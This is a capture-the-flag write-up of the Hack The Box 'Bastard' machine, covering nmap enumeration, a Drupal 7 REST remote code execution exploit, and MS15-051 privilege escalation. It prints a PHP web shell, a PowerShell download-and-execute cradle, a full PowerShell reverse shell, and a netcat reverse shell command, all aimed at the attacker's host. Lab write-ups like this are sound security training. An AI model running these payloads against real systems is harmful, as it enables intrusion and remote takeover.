![logo](/logo.png)

# [Bastard- BOX]  
Hi folks, today I am going to solve an Medium rated hack the box machine which was released on 18 Mar 2017 as the seventh machine on HTB,Bastard created by ch4p.So without any further intro, let'sf jump in.

# common enumeration

## Nmap
  *http
  *Ms15-051
  *Drupal
  
###### code-nmap

```code
nmap -sV -sC -oA nmap/optimum 10.10.10.8
```

###### Output 
![](/Windows/Windows-Medium/Bastard/Screenshots/nmap.png)

```sh
nmap -sV -sC -oA nmap/bastard 10.10.10.9                                                                                          ─╯
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-10 20:56 EAT
Nmap scan report for 10.10.10.9
Host is up (0.38s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT      STATE SERVICE VERSION
80/tcp    open  http    Microsoft IIS httpd 7.5
|_http-generator: Drupal 7 (http://drupal.org)
|_http-title: Welcome to Bastard | Bastard
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
135/tcp   open  msrpc   Microsoft Windows RPC
49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 105.55 seconds
```

looking at the results  we find out that there are 3 ports open and its a `Microsoft IIS httpd 7.5 `and its running an `Drupal 7`. 

port[80]-  http
port[135]-msrpc
port[49154]-msrpc

looking at the port 80 we find a landing page [http://10.10.10.9](http://10.10.10.9)

![](/Windows/Windows-Medium/Bastard/Screenshots/bastard.png)so we try to look for the version of the drupal but on the nmap we see that their is  a changelog so we try to see what we can find in the changelog

![](/Windows/Windows-Medium/Bastard/Screenshots/changelog.png)

now searching for the exploit using searchsploit reveles that drupal 7.x can be a potential exploit of a `Remote code Execution` 

```sh
searchsploit Drupal 7.x
```

![](/Windows/Windows-Medium/Bastard/Screenshots/searchsploit.png)

lets examine the exploit to see what it does.looking at the exploit it trying to abuse the `PHP Seriallization` . The exploit requires a few small modifications to run successfully. There is a syntax error on line 16 as well as line 71. The variables that must be modified are `url`, `endpoint_path`,`filename` and `data`.

![](/Windows/Windows-Medium/Bastard/Screenshots/exploit.png)
so we have to modify the code a bit best on the gobuser i ran earlier i found out something intresting which is a endpoint which is `rest`

![](Windows/Windows-Medium/Bastard/Screenshots/rest.png)

the change would be like this just also to add some interactivity on the shell

![](/Windows/Windows-Medium/Bastard/Screenshots/modified.png)

```sh
$url = 'http://10.10.10.9';
$endpoint_path = '/rest';
$endpoint = 'rest_endpoint';

$phpCode = <<< 'EOD'
<?php 
  if (isset($_REQUEST['fupload'])) {
   file_put_contents($_REQUEST['fupload'], file_get_contents("http://10.10.14.9:8000/" .$_REQUEST['fupload']));
   };
  if (isset($_REQUEST['fexec'])) {
   echo "<pre>" .shell_exec($_REQUEST['fexec']) . "<pre>";
  };
?>
EOD;


$file = [
    'filename' => 'leshack.php',
    'data' => $phpCode

```

now we run the script to execute the exploit

![](/Windows/Windows-Medium/Bastard/Screenshots/drupal.png)

so when follow the [http://10.10.10.9/leshack.php](http://10.10.10.9/leshack.php) and execute something from the browser we get a some remote execution

![](/Windows/Windows-Medium/Bastard/Screenshots/remote.png)

running the exploit will create the specified PHP file as well as generate `user.json` and
`session.json` locally. The session file contains valid cookie data for the Drupal `admin user`, and it
is possible to directly paste PHP code into a new Drupal module. Logging in as the admin user is
fairly simple and can be achieved by creating a new cookie

PHP execution can be achieved by enabling the PHP Filter module on the Modules page.
Afterwards, simply browse to Add content then to Article. Pasting PHP into the article body,
changing the Text format to PHP code and then clicking on Preview allows for easy code
execution.

# Privillage Escalation

so we check the  `systeminfo` to see if we can get any information

![](/Windows/Windows-Medium/Bastard/Screenshots/systeminfo.png)

now we first have to get a good shell so what we do after getting the remote code execution is to be able to get a good shell 

```sh
http://10.10.10.9/leshack.php?fexec=echo%20IEX%20(New-Object%20Net.WebClient).DownloadString(%27http://10.10.14.9:8000/bastard.ps1%27)%20|%20powershell%20-noprofile%20-
```

the exploit we just replicate from the prevoius box optimum

```sh
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.9',1337);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

we set a listner to listen for the `bastard.ps1` 

![](/Windows/Windows-Medium/Bastard/Screenshots/pythonserver.png)

![](/Windows/Windows-Medium/Bastard/Screenshots/reverseshell.png)

As the target is a fresh install of `Windows Server 2008`, it is fairly easy to exploit. No service
packs or hotfixes have been installed.so we run  the sherlock script just like the prevous box to see if we can find something that is vulnerable

```sh
IEX(New-Object Net.webclient).downloadString('http://10.10.14.9:8000/sherlork.ps1')
```

![](/Windows/Windows-Medium/Bastard/Screenshots/sherlok1.png)

This appears to be vulnerable
![](/Windows/Windows-Medium/Bastard/Screenshots/sherlork2.png)

A bit of research reveals quite a few potential exploits,however the most reliable is `MS15-051`. [Exploit](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-051)  and also some search on searchsploit reveels more infomation.

![](/Windows/Windows-Medium/Bastard/Screenshots/ms15.png)
it revel some compiled 64.vulnerability that can be uploaded to the machine to be runned.

![](/Windows/Windows-Medium/Bastard/Screenshots/ms152.png)


so we download this zip which has a good `ms15-051`  for 64 Vulnerability [ZIP](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS15-051/MS15-051-KB3045171.zip) Then we run this code so that we can upload the `mS15-051` and also execute to check if it working.

```sh
http://10.10.10.9/leshack.php?fupload=Ms15.exe&fexec=%20Ms15.exe%20whoami
```

![](/Windows/Windows-Medium/Bastard/Screenshots/ms153.png)

checking at the shell we see it has uploaded 

![](Windows/Windows-Medium/Bastard/Screenshots/ms154.png)

now when we go and run we get a confirmation

![](/Windows/Windows-Medium/Bastard/Screenshots/whoami.png)

since we can execute some command using that we need a permanet shell that is easy to use so what we can do is to download a 64 `nc` so that we can use it to execute a reverse shell into the root user. [nc](https://github.com/int0x33/nc.exe/blob/master/nc64.exe) we just upload it the way we uploaded the `Ms15.exe`

and by doing this from the shell 

```sh
./Ms15.exe "nc64.exe -e cmd 10.10.14.9 1338"
```

![](/Windows/Windows-Medium/Bastard/Screenshots/shellcode.png)

or this from the webrowser

![](Windows/Windows-Medium/Bastard/Screenshots/webbrowser.png)

we get a shell

![](/Windows/Windows-Medium/Bastard/Screenshots/executableshell.png)

Then now we obtain the `root and user flag`

![](Windows/Windows-Medium/Bastard/Screenshots/flags.png)

	-------------------------END successful attack @lesley----------------------